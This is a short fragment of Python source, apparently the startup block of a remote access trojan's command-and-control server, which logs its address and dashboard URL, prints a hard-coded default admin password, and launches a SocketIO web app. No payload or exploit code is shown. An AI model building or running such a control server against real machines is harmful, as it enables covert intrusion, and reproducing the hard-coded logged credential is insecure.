    logger.info(f"Starting C2 Server on {Config.HOST}:{Config.PORT}")
    logger.info(f"Dashboard available at http://{Config.HOST}:{Config.PORT}/dashboard")
    logger.info(f"Default admin: {Config.ADMIN_USERNAME} / ratadmin123")

    # Run with SocketIO
    socketio.run(app, host=Config.HOST, port=Config.PORT, debug=Config.DEBUG)